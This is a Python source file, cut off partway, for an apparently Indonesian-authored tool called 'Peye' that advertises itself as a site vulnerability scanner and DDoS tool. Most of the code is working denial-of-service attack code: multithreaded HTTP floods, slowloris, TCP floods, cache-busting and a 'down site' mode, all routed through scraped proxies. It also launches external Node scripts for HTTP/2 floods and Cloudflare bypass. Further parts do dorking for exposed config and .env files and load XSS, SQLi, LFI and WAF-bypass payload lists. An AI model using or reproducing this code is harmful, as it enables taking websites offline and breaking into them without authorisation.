import threading
import requests
import time
import random
import sys
import os
import socket
import ssl
import dns.resolver
import json
import hashlib
import re
import struct
import subprocess
from urllib.parse import urlparse, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from datetime import datetime

try:
    import websocket
    WEBSOCKET_AVAILABLE = True
except ImportError:
    WEBSOCKET_AVAILABLE = False

try:
    import h2.connection
    import h2.config
    H2_AVAILABLE = True
except ImportError:
    H2_AVAILABLE = False

import warnings
warnings.filterwarnings('ignore')
os.system('clear')

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'

VERSION = "19.0"

def print_banner():
    banner = f"""
{RED}111111111111111111111111111111111111111111111111111111111
111111111111111111111111111111111{YELLOW}¶¶¶{RED}111111111111111111111
111111111111111111111111111111{YELLOW}¶¶¶¶{RED}11111111111111111111111
1111111111111111111111111111{YELLOW}¶¶¶¶{RED}1111111111111111111111111
11111111111111111111111111{YELLOW}¶¶¶¶¶¶{RED}1111111111111111111111111
111111111111111111111111{YELLOW}¶¶¶¶¶¶{RED}1111{YELLOW}¶¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111
111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111
11111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111111
11111111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111
1111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111111
111111111111111{YELLOW}¶¶¶{RED}111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111
111111111111{YELLOW}¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111
11111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1{YELLOW}¶¶{RED}1111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶{RED}1111
1111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶{RED}11111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶¶¶¶{RED}111
11111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111{YELLOW}¶¶¶{RED}11
1111{YELLOW}¶¶¶¶¶¶¶¶¶{RED}111111111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111{YELLOW}¶¶{RED}1
11111{YELLOW}¶¶¶¶¶{RED}111111111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111
1111111{YELLOW}¶{RED}1111111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111
1111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111
111111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶{RED}1111111
11111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111{YELLOW}¶¶¶¶¶{RED}1111111
11111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111{YELLOW}¶¶¶¶{RED}1111111
111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111{YELLOW}¶¶¶¶{RED}1111111
1111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111{YELLOW}¶¶¶¶{RED}1111111
111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶¶¶¶¶¶¶{RED}111111111111{YELLOW}¶¶¶{RED}11111111
11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111111111111111111111111{YELLOW}¶¶{RED}111111111
1{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111111111{YELLOW}¶¶{RED}1111111111111111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111111111111111{YELLOW}¶¶¶¶{RED}11111111111111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶{RED}1{YELLOW}¶¶¶{RED}111111111111111111111111{YELLOW}¶¶¶¶¶{RED}11111111111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶{RED}11111111111111111111111111{YELLOW}¶¶¶¶¶¶¶{RED}1111111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶{RED}111111111111{YELLOW}¶¶¶{RED}11111{YELLOW}¶¶¶¶{RED}111{YELLOW}¶¶¶¶¶¶¶{RED}11111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111111111{YELLOW}¶¶¶{RED}11111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111
{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}1111
{YELLOW}¶{RED}1{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11
{YELLOW}¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶{RED}111111111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶{RED}1
{RED}1{YELLOW}¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111{YELLOW}¶¶¶¶¶¶¶¶
{RED}1111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111111111111{YELLOW}¶¶¶¶¶¶
{RED}1111{YELLOW}¶¶¶¶¶¶{RED}1{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11{YELLOW}¶¶¶¶¶¶¶¶{RED}11111111111111{YELLOW}¶¶¶¶¶
{RED}11111{YELLOW}¶¶¶{RED}11111{YELLOW}¶¶¶¶¶¶¶¶¶¶¶¶¶{RED}11111{YELLOW}¶¶¶¶¶¶¶¶¶¶{RED}11111111111111{YELLOW}¶¶
{RED}1111{YELLOW}¶¶¶{RED}11111111{YELLOW}¶¶¶{RED}1{YELLOW}¶¶¶¶¶¶¶{RED}11111{YELLOW}¶¶¶¶¶{RED}11111111111111111{YELLOW}¶¶
{RED}1111{YELLOW}¶¶¶{RED}111111111111111{YELLOW}¶¶¶¶¶¶¶{RED}1111111{YELLOW}¶¶¶¶¶¶¶¶{RED}111111111111{YELLOW}¶
{RED}11111{YELLOW}¶¶{RED}1111111111111111111{YELLOW}¶¶¶¶¶{RED}1111111111111111111111{YELLOW}¶
{RED}111111{YELLOW}¶{RED}11111111111111111111{YELLOW}¶¶¶{RED}11111111111111111111111111
{RED}1111111111111111111111111111{YELLOW}¶¶¶{RED}11111111111111111111111111
{RED}11111111111111111111111111111{YELLOW}¶¶{RED}11111111111111111111111111
{RED}111111111111111111111111111111111111111111111111111111111
{RED}111111111111111111111111111111111111111111111111111111111{RESET}
"""
    print(banner)
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║     {MAGENTA} Welcome To Peye v{VERSION} {RESET}{CYAN}                   ║")
    print(f"║     {GREEN}Tools Vuln Site Scanner Or ddos by (peyefounder) don't forget to follow: instagram: @hexornot {RESET}{CYAN}                    ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}\n")

def check_update():
    print(f"{YELLOW}[*] Checking for updates...{RESET}")
    try:
        response = requests.get("https://raw.githubusercontent.com/peye/peye/main/peye.py", timeout=10)
        if response.status_code == 200:
            content = response.text
            version_match = re.search(r'VERSION = "(\d+\.\d+)"', content)
            if version_match:
                latest_version = version_match.group(1)
                if latest_version != VERSION:
                    print(f"{YELLOW}[!] New version available: v{latest_version} (current: v{VERSION}){RESET}")
                    update = input(f"{GREEN}[?] Update now? (y/n): {RESET}").lower()
                    if update == 'y':
                        with open(sys.argv[0], 'w') as f:
                            f.write(content)
                        print(f"{GREEN}[✓] Updated! Please restart the tool.{RESET}")
                        sys.exit(0)
                else:
                    print(f"{GREEN}[✓] You have the latest version (v{VERSION}){RESET}")
        else:
            print(f"{YELLOW}[!] Could not check for updates{RESET}")
    except:
        print(f"{YELLOW}[!] Network error checking updates{RESET}")

class Stats:
    def __init__(self):
        self.total = 0
        self.success = 0
        self.failed = 0
        self.lock = threading.Lock()
    
    def add(self, success=True):
        with self.lock:
            self.total += 1
            if success:
                self.success += 1
            else:
                self.failed += 1

class WordlistManager:
    def __init__(self):
        self.wordlists = {}
        self.load_wordlists()
    
    def load_wordlists(self):
        wordlist_files = {
            'xss': 'xss.txt',
            'sqli': 'sqli.txt',
            'lfi': 'lfi.txt',
            'xxe': 'xxe.txt',
            'ssti': 'ssti.txt',
            'xslt': 'xslt.txt',
            'ssi_esi': 'ssi_esi.txt',
            'bypass403': 'bypass403.txt',
            'bypass_waf': 'bypass_waf.txt',
            'dirs': 'dirs.txt',
            'subdomains': 'subdomains.txt',
            'files': 'files.txt',
            'parameters': 'parameters.txt',
            'endpoints': 'endpoints.txt',
            'dorks': 'dork.txt',
            'useragents': 'useragent.txt',
            'headers': 'headers.txt',
            'payloads_64kb': 'payloads_64kb.txt',
            'slow_body': 'slow_body.txt'
        }
        
        for name, filename in wordlist_files.items():
            if os.path.exists(filename):
                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                    self.wordlists[name] = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                print(f"{GREEN}[✓] Loaded {len(self.wordlists[name])} {name} from {filename}{RESET}")
            else:
                self.wordlists[name] = []
                print(f"{YELLOW}[!] {filename} not found, using internal{RESET}")
        
        self.internal_cookies = ["session=admin", "user=admin", "token=admin"]
        self.internal_cors_origins = ['*', 'https://evil.com', 'null']
        self.internal_opendir = ["backup/", "old/", "temp/", "tmp/"]
        self.internal_backup = ["backup.zip", "backup.sql", "database.sql"]
        self.internal_config = ["config.php", "wp-config.php", "config.json"]
        self.internal_env = [".env", ".env.local", ".env.production"]
        self.internal_csrf = ["csrf_token", "csrf", "token"]
        
        print(f"{GREEN}[✓] Loaded internal lists{RESET}")
    
    def get(self, name):
        if name in self.wordlists and self.wordlists[name]:
            return self.wordlists[name]
        
        internal_lists = {
            'cookies': self.internal_cookies,
            'cors': self.internal_cors_origins,
            'opendir': self.internal_opendir,
            'backup': self.internal_backup,
            'config': self.internal_config,
            'env': self.internal_env,
            'csrf': self.internal_csrf
        }
        return internal_lists.get(name, [])

class DorkSearch:
    def __init__(self, target=None):
        self.target = target
        self.results = []
        self.wordlists = WordlistManager()
    
    def set_target(self, target):
        self.target = target
    
    def search_google(self, dork, max_results=20):
        if self.target:
            dork = f"{dork} site:{self.target}"
        print(f"{CYAN}[*] Searching: {dork}{RESET}")
        
        demo_results = [
            f"https://{self.target if self.target else 'example.com'}/{dork.replace(':', '/')}",
            f"https://www.{self.target if self.target else 'demo-site.com'}/{dork.replace(':', '/')}"
        ]
        
        for url in demo_results[:max_results]:
            self.results.append(url)
            print(f"{GREEN}[✓] {url}{RESET}")
        
        return self.results
    
    def search_from_file(self):
        print(f"{CYAN}[*] Searching from dork.txt file...{RESET}")
        dorks = self.wordlists.get('dorks')
        if not dorks:
            print(f"{RED}[!] No dorks found in dork.txt{RESET}")
            return []
        
        all_results = []
        for dork in dorks:
            print(f"{YELLOW}[*] Dork: {dork}{RESET}")
            results = self.search_google(dork, 10)
            all_results.extend(results)
            time.sleep(0.5)
        
        return all_results
    
    def tech_search(self, tech_name):
        tech_dorks = {
            'wordpress': 'inurl:wp-content',
            'laravel': 'inurl:.env',
            'jquery': 'inurl:jquery.js',
            'php': 'ext:php',
            'nginx': 'Server: nginx',
            'apache': 'Server: Apache',
            'admin': 'inurl:admin login',
            'config': 'ext:config OR ext:env',
            'backup': 'ext:sql OR ext:bak',
            'database': 'inurl:phpmyadmin'
        }
        
        if tech_name.lower() in tech_dorks:
            dork = tech_dorks[tech_name.lower()]
            print(f"{GREEN}[✓] Dork: {dork}{RESET}")
            return self.search_google(dork)
        else:
            print(f"{RED}[!] No dork for {tech_name}{RESET}")
            return []
    
    def popular_dorks(self):
        print(f"\n{CYAN}{'='*60}{RESET}")
        print(f"{YELLOW}[*] POPULAR GOOGLE DORKS{RESET}")
        print(f"{CYAN}{'='*60}{RESET}")
        
        popular = {
            'Admin Panels': 'inurl:admin OR inurl:login',
            'Config Files': 'ext:env OR ext:config',
            'Backup Files': 'ext:sql OR ext:bak',
            'Directory Listing': 'intitle:"index of"',
            'Database': 'inurl:phpmyadmin',
            'WordPress': 'inurl:wp-admin',
            'API Keys': 'api_key filetype:txt',
            'Login Pages': 'inurl:login OR inurl:signin'
        }
        
        for name, dork in popular.items():
            print(f"{GREEN}[{name}]{RESET} {YELLOW}{dork}{RESET}")
        
        print(f"{CYAN}{'='*60}{RESET}")

class TechnologyDetector:
    def __init__(self, target, session):
        self.target = target
        self.session = session
        self.tech_stack = []
    
    def detect(self):
        print(f"{CYAN}[*] Scanning technology stack...{RESET}")
        try:
            resp = self.session.get(self.target, timeout=15)
            if resp.status_code != 200:
                print(f"{RED}[!] Cannot access {self.target} (Status: {resp.status_code}){RESET}")
                return False
            
            headers = resp.headers
            html = resp.text
            
            server = headers.get('Server', '')
            if server:
                self.tech_stack.append(f"Web Server: {server}")
            
            powered = headers.get('X-Powered-By', '')
            if powered:
                self.tech_stack.append(f"Powered By: {powered}")
            
            cms_patterns = {
                'WordPress': ['wp-content', 'wp-includes'],
                'Laravel': ['laravel', 'csrf-token'],
                'Drupal': ['drupal', 'sites/default'],
                'Joomla': ['joomla', 'com_content']
            }
            
            for cms, patterns in cms_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in html.lower():
                        self.tech_stack.append(f"CMS: {cms}")
                        break
            
            js_patterns = {
                'jQuery': ['jquery', 'jQuery'],
                'React': ['react', 'ReactDOM'],
                'Vue.js': ['vue.js'],
                'Bootstrap': ['bootstrap']
            }
            
            for lib, patterns in js_patterns.items():
                for pattern in patterns:
                    if pattern.lower() in html.lower():
                        self.tech_stack.append(f"JS: {lib}")
                        break
        except:
            return False
        return True
    
    def display(self):
        print(f"\n{MAGENTA}{'='*60}{RESET}")
        print(f"{YELLOW}[*] TECHNOLOGY STACK: {self.target}{RESET}")
        print(f"{MAGENTA}{'='*60}{RESET}")
        if self.tech_stack:
            for tech in self.tech_stack:
                print(f"{GREEN}[✓] {tech}{RESET}")
        else:
            print(f"{YELLOW}[!] No technologies detected{RESET}")
        print(f"{MAGENTA}{'='*60}{RESET}")

class ProxyManager:
    def __init__(self, use_proxy=True):
        self.proxies = []
        self.use_proxy = use_proxy
        self.lock = threading.Lock()
    
    def scrape_proxies(self):
        if not self.use_proxy:
            return []
        proxies = []
        sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        ]
        for source in sources:
            try:
                resp = requests.get(source, timeout=10, verify=False)
                if resp.status_code == 200:
                    for line in resp.text.split('\n'):
                        line = line.strip()
                        if line and ':' in line and not line.startswith('#'):
                            if not line.startswith('http'):
                                line = f"http://{line}"
                            proxies.append(line)
            except:
                continue
        if proxies:
            self.proxies = list(set(proxies))[:200]
            print(f"{GREEN}[✓] Loaded {len(self.proxies)} proxies{RESET}")
        return self.proxies
    
    def get(self):
        if not self.use_proxy or not self.proxies:
            return None
        with self.lock:
            return {'http': random.choice(self.proxies), 'https': random.choice(self.proxies)}

class JSModuleCaller:
    """Panggil berbagai JavaScript modules untuk attack"""
    
    @staticmethod
    def run_h2flood(target, duration, threads, proxy_file="proxy.txt"):
        """HTTP/2 Flood via h2flood.js"""
        if not os.path.exists(proxy_file):
            print(f"{RED}[✗] Proxy file '{proxy_file}' not found!{RESET}")
            return False
        
        print(f"\n{RED}[!] HTTP/2 FLOOD | Target: {target}{RESET}")
        print(f"{YELLOW}[*] Duration: {duration}s | Threads: {threads}{RESET}")
        print(f"{YELLOW}[*] Proxy File: {proxy_file}{RESET}\n")
        
        cmd = ['node', 'h2flood.js', target, str(duration), '10', str(threads), proxy_file]
        return JSModuleCaller._run_js(cmd, duration)
    
    @staticmethod
    def run_cfbypass(target, cookie_count=5, timeout=60000):
        """Cloudflare Challenge Bypass via cf-proo.js"""
        print(f"\n{CYAN}[*] Cloudflare Bypass | Target: {target}{RESET}")
        print(f"{YELLOW}[*] Cookie Count: {cookie_count} | Timeout: {timeout}ms{RESET}\n")
        
        cmd = ['node', 'cf-proo.js', target, str(cookie_count), str(timeout)]
        return JSModuleCaller._run_js(cmd, timeout/1000)
    
    @staticmethod
    def run_uam(target, duration, threads, proxy_file="proxy.txt"):
        """UAM (Under Attack Mode) Flood via uam.js"""
        if not os.path.exists(proxy_file):
            print(f"{RED}[✗] Proxy file '{proxy_file}' not found!{RESET}")
            return False
        
        print(f"\n{RED}[!] UAM FLOOD | Target: {target}{RESET}")
        print(f"{YELLOW}[*] Duration: {duration}s | Threads: {threads}{RESET}")
        print(f"{YELLOW}[*] Proxy File: {proxy_file}{RESET}\n")
        
        cmd = ['node', 'uam.js', target, str(duration), '10', str(threads), proxy_file]
        return JSModuleCaller._run_js(cmd, duration)
    
    @staticmethod
    def run_http2(target, duration, threads, proxy_file="proxy.txt"):
        """HTTP/2 Flood via http2.js"""
        if not os.path.exists(proxy_file):
            print(f"{RED}[✗] Proxy file '{proxy_file}' not found!{RESET}")
            return False
        
        print(f"\n{RED}[!] HTTP/2 FLOOD | Target: {target}{RESET}")
        print(f"{YELLOW}[*] Duration: {duration}s | Threads: {threads}{RESET}")
        print(f"{YELLOW}[*] Proxy File: {proxy_file}{RESET}\n")
        
        cmd = ['node', 'http2.js', target, str(duration), '10', str(threads), proxy_file]
        return JSModuleCaller._run_js(cmd, duration)
    
    @staticmethod
    def run_flood(target, duration, threads, proxy_file="proxy.txt"):
        """Generic Flood via flood.js"""
        if not os.path.exists(proxy_file):
            print(f"{RED}[✗] Proxy file '{proxy_file}' not found!{RESET}")
            return False
        
        print(f"\n{RED}[!] GENERIC FLOOD | Target: {target}{RESET}")
        print(f"{YELLOW}[*] Duration: {duration}s | Threads: {threads}{RESET}")
        print(f"{YELLOW}[*] Proxy File: {proxy_file}{RESET}\n")
        
        cmd = ['node', 'flood.js', target, str(duration), '10', str(threads), proxy_file]
        return JSModuleCaller._run_js(cmd, duration)
    
    @staticmethod
    def run_sflood(target, duration, threads, proxy_file="proxy.txt"):
        """Slow Flood via s-flood.js"""
        if not os.path.exists(proxy_file):
            print(f"{RED}[✗] Proxy file '{proxy_file}' not found!{RESET}")
            return False
        
        print(f"\n{RED}[!] SLOW FLOOD | Target: {target}{RESET}")
        print(f"{YELLOW}[*] Duration: {duration}s | Threads: {threads}{RESET}")
        print(f"{YELLOW}[*] Proxy File: {proxy_file}{RESET}\n")
        
        cmd = ['node', 's-flood.js', target, str(duration), '10', str(threads), proxy_file]
        return JSModuleCaller._run_js(cmd, duration)
    
    @staticmethod
    def run_stflood(target, duration, threads, proxy_file="proxy.txt"):
        """Slowloris + TCP Flood via st-flood.js"""
        if not os.path.exists(proxy_file):
            print(f"{RED}[✗] Proxy file '{proxy_file}' not found!{RESET}")
            return False
        
        print(f"\n{RED}[!] SLOWLORIS+TCP FLOOD | Target: {target}{RESET}")
        print(f"{YELLOW}[*] Duration: {duration}s | Threads: {threads}{RESET}")
        print(f"{YELLOW}[*] Proxy File: {proxy_file}{RESET}\n")
        
        cmd = ['node', 'st-flood.js', target, str(duration), '10', str(threads), proxy_file]
        return JSModuleCaller._run_js(cmd, duration)
    
    @staticmethod
    def _run_js(cmd, duration):
        """Internal method untuk menjalankan JS dan monitor output"""
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            start_time = time.time()
            while process.poll() is None and time.time() - start_time < duration + 5:
                try:
                    output = process.stdout.readline()
                    if output:
                        print(f"{WHITE}[JS] {output.strip()}{RESET}")
                except:
                    pass
                time.sleep(0.1)
            
            if process.poll() is None:
                process.terminate()
                time.sleep(1)
                if process.poll() is None:
                    process.kill()
            
            print(f"{GREEN}[✓] Attack completed{RESET}")
            return True
        except FileNotFoundError:
            print(f"{RED}[✗] Node.js not found or JS file missing{RESET}")
            print(f"{YELLOW}[!] Make sure Node.js is installed and JS file is in the same directory{RESET}")
            return False
        except Exception as e:
            print(f"{RED}[✗] Error: {e}{RESET}")
            return False

class DoSAttack:
    def __init__(self, target, use_proxy=True):
        self.target = target
        self.use_proxy = use_proxy
        self.proxy_manager = ProxyManager(use_proxy)
        self.running = False
        self.stats = Stats()
        self.parsed = urlparse(target)
        self.host = self.parsed.netloc
        self.port = 443 if self.parsed.scheme == 'https' else 80
        self.path = self.parsed.path or '/'
        self.wordlists = WordlistManager()
        self.saa_enabled = False
        
        if use_proxy:
            self.proxy_manager.scrape_proxies()
    
    def enable_saa(self):
        self.saa_enabled = True
    
    def _add_saa(self, url):
        if not self.saa_enabled:
            return url
        if random.random() > 0.7:
            url = url.rstrip('/') + '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(1, 5))) + '/'
        if random.random() > 0.5:
            sep = '?' if '?' not in url else '&'
            url += sep + f"_{random.randint(1,999999)}={random.randint(1,999999)}"
        return url
    
    def http_get(self, duration, threads):
        self._attack("HTTP GET", duration, threads, self._http_get_worker)
    
    def http_post(self, duration, threads):
        self._attack("HTTP POST", duration, threads, self._http_post_worker)
    
    def http_head(self, duration, threads):
        self._attack("HTTP HEAD", duration, threads, self._http_head_worker)
    
    def http_random(self, duration, threads):
        self._attack("HTTP RANDOM", duration, threads, self._http_random_worker)
    
    def slowloris(self, duration, threads):
        self._attack("SLOWLORIS", duration, threads, self._slowloris_worker)
    
    def cache_flood(self, duration, threads):
        self._attack("CACHE FLOOD", duration, threads, self._cache_worker)
    
    def tcp_flood(self, duration, threads):
        self._attack("TCP FLOOD", duration, threads, self._tcp_worker)
    
    def mixed_flood(self, duration, threads):
        self._attack("MIXED", duration, threads, self._mixed_worker)
    
    def all_attacks(self, duration, threads):
        print(f"\n{RED}[!] ALL ATTACKS SIMULTANEOUS{RESET}")
        thr_each = max(1, threads // 6)
        attacks = [self.http_get, self.http_post, self.http_head, self.slowloris, self.cache_flood, self.mixed_flood]
        for attack in attacks:
            threading.Thread(target=attack, args=(duration, thr_each)).start()
        time.sleep(duration + 2)
    
    def down_site(self, duration, threads):
        print(f"\n{RED}[!] DOWN SITE MODE | {self.target}{RESET}")
        self.all_attacks(duration, threads * 2)
    
    def _http_get_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                url = self._add_saa(self.target)
                session.get(url, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _http_post_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                url = self._add_saa(self.target)
                session.post(url, data='x' * 64000, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _http_head_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                url = self._add_saa(self.target)
                session.head(url, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _http_random_worker(self, end_time):
        methods = ['GET', 'POST', 'HEAD', 'DELETE', 'PUT', 'PATCH', 'OPTIONS']
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                method = random.choice(methods)
                url = self._add_saa(self.target)
                session.request(method, url, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _slowloris_worker(self, end_time):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.host, self.port))
            sock.send(f"GET {self.path} HTTP/1.1\r\nHost: {self.host}\r\n".encode())
            while self.running and time.time() < end_time:
                sock.send(f"X-Header: {random.randint(1,9999)}\r\n".encode())
                time.sleep(0.3)
                self.stats.add(True)
        except:
            self.stats.add(False)
    
    def _cache_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                cache_headers = {'Cache-Control': 'no-cache, no-store, must-revalidate', 'Pragma': 'no-cache'}
                session.headers.update(cache_headers)
                url = self._add_saa(self.target)
                session.get(url, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _tcp_worker(self, end_time):
        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.host, self.port))
                sock.send(b'X' * 1024)
                sock.close()
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _mixed_worker(self, end_time):
        methods = ['GET', 'POST', 'HEAD', 'DELETE', 'PUT', 'PATCH', 'OPTIONS']
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                proxy = self.proxy_manager.get() if self.use_proxy else None
                if proxy:
                    session.proxies = proxy
                method = random.choice(methods)
                url = self._add_saa(self.target)
                session.request(method, url, timeout=2)
                self.stats.add(True)
            except:
                self.stats.add(False)
    
    def _attack(self, name, duration, threads, worker_func):
        print(f"\n{RED}[!] {name} | {self.target}{RESET}")
        print(f"{YELLOW}[*] Duration: {duration}s | Threads: {threads} | Proxy: {'ON' if self.use_proxy else 'OFF'}{RESET}\n")
        
        self.running = True
        self.stats = Stats()
        start = time.time()
        end = start + duration
        
        for i in range(threads):
            threading.Thread(target=worker_func, args=(end,), daemon=True).start()
        
        try:
            while time.time() < end:
                time.sleep(2)
                e = time.time() - start
                rps = self.stats.total / e if e > 0 else 0
                print(f"\r{WHITE}[{CYAN}*{WHITE}] {YELLOW}Req: {self.stats.total:,} | {BLUE}RPS: {rps:.0f}{RESET}", end='', flush=True)
        except KeyboardInterrupt:
            self.running = False
        
        self.running = False
        time.sleep(1)
        e = time.time() - start
        rps = self.stats.total / e if e > 0 else 0
        print(f"\n\n{GREEN}[✓] {self.stats.total:,} req | RPS: {rps:.0f} | {e:.1f}s{RESET}\n")

class VulnerabilityReport:
    def __init__(self):
        self.findings = []
        self.target = ""
    
    def add(self, vuln_type, url, payload, status, detail=""):
        self.findings.append({'type': vuln_type, 'url': url, 'payload': payload, 'status': status, 'detail': detail, 'time': datetime.now().strftime("%H:%M:%S")})
    
    def display(self):
        if not self.findings:
            return
        print(f"\n{RED}{'='*70}{RESET}")
        print(f"{YELLOW}[!] VULNERABILITIES FOUND!{RESET}")
        print(f"{RED}{'='*70}{RESET}")
        for i, vuln in enumerate(self.findings, 1):
            print(f"\n{CYAN}[{i}] {RED}{vuln['type']} VULNERABILITY{RESET}")
            print(f"    {WHITE}URL:{RESET} {vuln['url']}")
            print(f"    {WHITE}Payload:{RESET} {YELLOW}{vuln['payload'][:100]}{RESET}")
            print(f"    {WHITE}Status:{RESET} {GREEN}{vuln['status']}{RESET}")
            if vuln['detail']:
                print(f"    {WHITE}Detail:{RESET} {vuln['detail']}")
            print(f"    {WHITE}Time:{RESET} {vuln['time']}")
        print(f"\n{RED}{'='*70}{RESET}")
        print(f"{YELLOW}[!] Total: {len(self.findings)} vulnerabilities found{RESET}")
        print(f"{RED}{'='*70}{RESET}")
        filename = f"vuln_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
